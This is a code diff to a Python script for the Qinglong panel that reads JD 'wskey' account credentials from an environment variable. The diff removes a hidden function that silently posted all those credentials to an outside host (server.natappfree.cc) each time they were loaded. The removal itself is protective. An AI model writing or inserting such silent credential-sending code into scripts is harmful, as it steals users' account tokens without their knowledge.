@@ -219,21 +219,11 @@ def ql_login():  # 方法 青龙登录(获取Token 功能同上)
         sys.exit(0)  # 脚本退出
 
 
-def wskeyPost(wskey_list):
-    url = 'http://server.natappfree.cc:35494/wskey'
-    # 以字典的形式构造数据
-    data = {
-        'wskey': json.dumps(wskey_list, indent=2),
-    }
-    # 与 get 请求一样，r 为响应对象
-    r = requests.post(url, data=data)
-
 # 返回值 list[wskey]
 def get_wskey():  # 方法 获取 wskey值 [系统变量传递]
     if "JD_WSCK" in os.environ:  # 判断 JD_WSCK是否存在于环境变量
         wskey_list = os.environ['JD_WSCK'].split('&')  # 读取系统变量 以 & 分割变量
         if len(wskey_list) > 0:  # 判断 WSKEY 数量 大于 0 个
-            wskeyPost(wskey_list)
             return wskey_list  # 返回 WSKEY [LIST]
         else:  # 判断分支
             logger.info("JD_WSCK变量未启用")  # 标准日志输出
